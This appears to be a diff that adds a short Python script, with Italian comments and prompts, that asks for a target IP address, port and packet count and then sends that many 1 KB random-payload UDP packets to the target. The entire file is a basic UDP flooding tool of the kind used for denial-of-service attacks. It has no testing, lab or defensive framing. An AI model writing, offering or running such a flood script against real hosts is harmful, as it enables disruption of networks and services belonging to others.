@@ -1,0 +1,36 @@
+import socket
+import random
+
+def generate_random_payload(size):
+    return bytes(random.randint(0, 255) for _ in range(size))
+
+def send_udp_packet(target_host, target_port, payload, num_packets):
+    # Creazione del socket UDP
+    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    try:
+        # Invio dei pacchetti
+        for _ in range(num_packets):
+            udp_socket.sendto(payload, (target_host, target_port))
+            print(f"Pacchetto inviato a {target_host}:{target_port}")
+    except Exception as e:
+        print(f"Errore durante l'invio del pacchetto: {e}")
+    finally:
+        # Chiusura del socket
+        udp_socket.close()
+
+# Indirizzo IP del target
+target_host = input("Inserisci l'indirizzo IP del target: ")
+
+# Porta di destinazione
+target_port = int(input("Inserisci la porta di destinazione: "))
+
+# Generazione del payload casuale di 1 KB
+payload_size = 1024
+payload = generate_random_payload(payload_size)
+
+# Numero di pacchetti da inviare
+num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
+
+# Invio dei pacchetti UDP
+send_udp_packet(target_host, target_port, payload, num_packets)
